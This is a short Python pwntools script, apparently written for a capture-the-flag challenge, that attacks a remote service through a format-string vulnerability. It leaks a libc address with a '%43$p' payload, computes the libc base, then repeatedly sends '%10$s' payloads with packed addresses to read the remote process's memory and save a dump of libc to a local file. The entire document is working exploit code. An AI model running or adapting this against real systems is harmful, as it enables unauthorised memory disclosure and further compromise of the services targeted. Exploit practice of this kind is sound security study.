#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

# context.log_level = 'debug'#critical/debug
# p = remote('nc.eonew.cn',10012)
# f = open("libc1.so", "ab+")
#f = open("64weiba", "ab+")


offset = 0x17669c
i=0
while True:
	p = remote('nc.eonew.cn',10012)
	f = open("libc.so", "ab+")
	p.sendline('%43$p')
	libc_base=(int(p.recvline(),16)&0xfffffffffffff000)-0x21000
	begin = libc_base
	while True:#i<13:#True:#
	    addr = begin + offset   
	    p.sendline("%10$saabbccddeef" + p64(addr))
	    try:
	        #info = p.recv(4)
	        info = p.recvuntil('aabbccddeef',drop=True)
	        remain = p.recvrepeat(0.1)#recv the tail to dump in cicle
	        print info.encode("hex")
	        print len(info)
	    except EOFError:
	        print "offset is " + hex(offset)
	        break
	    if len(info)==0:
	        print "info is null"
	        offset += 1
	        f.write('\x00')
	    else:
	        info += "\x00"
	        offset += len(info)
	        f.write(info)
	        f.flush()
	    #i = i + 1
	    print "offset is " + hex(offset)
	f.close()
	p.close()
